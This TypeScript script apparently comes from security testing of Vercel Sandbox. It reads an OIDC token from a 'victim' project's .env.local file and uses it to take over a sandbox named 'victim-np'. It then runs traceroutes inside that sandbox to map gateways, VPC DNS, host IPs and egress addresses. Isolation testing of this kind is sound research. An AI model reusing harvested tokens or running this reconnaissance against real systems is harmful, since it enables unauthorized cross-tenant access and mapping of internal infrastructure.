import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());

async function main() {
  const sbx = await Sandbox.get({ name: "victim-np", token: VICTIM, teamId: V.owner_id, projectId: V.project_id });
  console.log("policy:", JSON.stringify(sbx.networkPolicy));
  const res = await sbx.runCommand("bash", ["-c", `
set +e
echo "=== A. traceroute to google.com (default UDP mode) ==="
timeout 25 traceroute -n -w 2 -q 1 -m 10 google.com 2>&1 | head -15
echo "=== B. traceroute ICMP mode ==="
timeout 25 traceroute -n -I -w 2 -q 1 -m 10 google.com 2>&1 | head -12
echo "=== C. traceroute to gateway 100.64.0.1 ==="
timeout 15 traceroute -n -w 2 -q 1 -m 5 100.64.0.1 2>&1 | head -8
echo "=== D. traceroute to VPC DNS 172.31.0.2 ==="
timeout 15 traceroute -n -w 2 -q 1 -m 8 172.31.0.2 2>&1 | head -10
echo "=== E. traceroute to host VPC IP 172.31.16.7 ==="
timeout 15 traceroute -n -w 2 -q 1 -m 8 172.31.16.7 2>&1 | head -10
echo "=== F. whois/ip route via traceroute to egress public ip ==="
timeout 15 traceroute -n -w 2 -q 1 -m 8 18.232.1.245 2>&1 | head -10
echo DONE
`], { wait: true, timeout: 90_000 });
  console.log("exit:", res.exitCode);
  console.log(await res.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });
